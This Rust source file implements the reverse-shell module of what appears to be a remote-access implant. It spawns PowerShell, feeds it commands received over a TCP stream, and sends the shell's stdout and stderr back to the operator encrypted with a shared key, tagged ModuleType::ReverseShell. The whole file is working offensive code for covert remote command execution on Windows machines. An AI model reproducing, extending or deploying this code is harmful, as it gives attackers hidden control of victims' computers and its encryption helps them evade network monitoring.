use std::io::Read;

use std::sync::Arc;
use std::{io::Write, process::Command};
use std::process::Stdio;

use shared::{encrypted_write_from_key, DataPacket, ModuleType, StatusType};


use tokio::net::tcp::OwnedWriteHalf;
use tokio::sync::{mpsc, watch, Mutex};


pub struct ShellManager {
    pub stream_write: Arc<Mutex<OwnedWriteHalf>>,
    pub stream_read: Arc<Mutex<mpsc::Receiver<Vec<u8>>>>,
    pub status: watch::Sender<StatusType>,
    pub key: [u8; 32],
}

impl ShellManager {
    pub async fn start_shell(&self) -> std::io::Result<()> {
        self.status.send(StatusType::Active).unwrap();

        let mut child = Command::new("powershell") 
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("ERR");


        let mut child_stdin = child.stdin.take().unwrap();
        let mut child_stdout = child.stdout.take().unwrap();
        let mut child_stderr = child.stderr.take().unwrap();

        let (sx, rx) = watch::channel(false);
        let status = self.status.clone();
        let reader = self.stream_read.clone();
        let writer = self.stream_write.clone();
        let writer2 = self.stream_write.clone();
        // STDIN
        tokio::spawn( async move {
            loop {
                if let Some(data) = reader.lock().await.recv().await {
                    child_stdin.write(&data).unwrap();
                    if &data == b"exit\r\n" {
                        sx.send(true).unwrap();
                        status.send(StatusType::Stopped).unwrap();
                        break
                    }
                } else {
                    break
                }
                child_stdin.flush().unwrap();
            }   
        });
        let rxx = rx.clone();
        let key = self.key;
        // STDOUT
        tokio::spawn( async move {
            let mut buffer = [0; 2056];
            loop {
                if *rxx.borrow() {
                    break
                }
                let n = child_stdout.read(&mut buffer).unwrap();
                if n > 0 {
                    let data = DataPacket {
                        module_type: ModuleType::ReverseShell,
                        data: buffer[..n].to_vec()
                    };
                    encrypted_write_from_key(writer.clone(), &key, data).await?;
                }
            }
            Ok::<(), std::io::Error>(())
        });
        let rxxx = rx.clone();
        // STDERR
        tokio::spawn( async move {
            let mut buffer = [0; 1024];
            loop {
                if *rxxx.borrow() {
                    break
                }
                let n = child_stderr.read(&mut buffer).unwrap();
                if n > 0 {
                    let data = DataPacket {
                        module_type: ModuleType::ReverseShell,
                        data: buffer[..n].to_vec(),
                    };
                    encrypted_write_from_key(writer2.clone(), &key, data).await?;

                }
            }
            Ok::<(), std::io::Error>(())
        }); 

        Ok::<(), std::io::Error>(())
    }
}


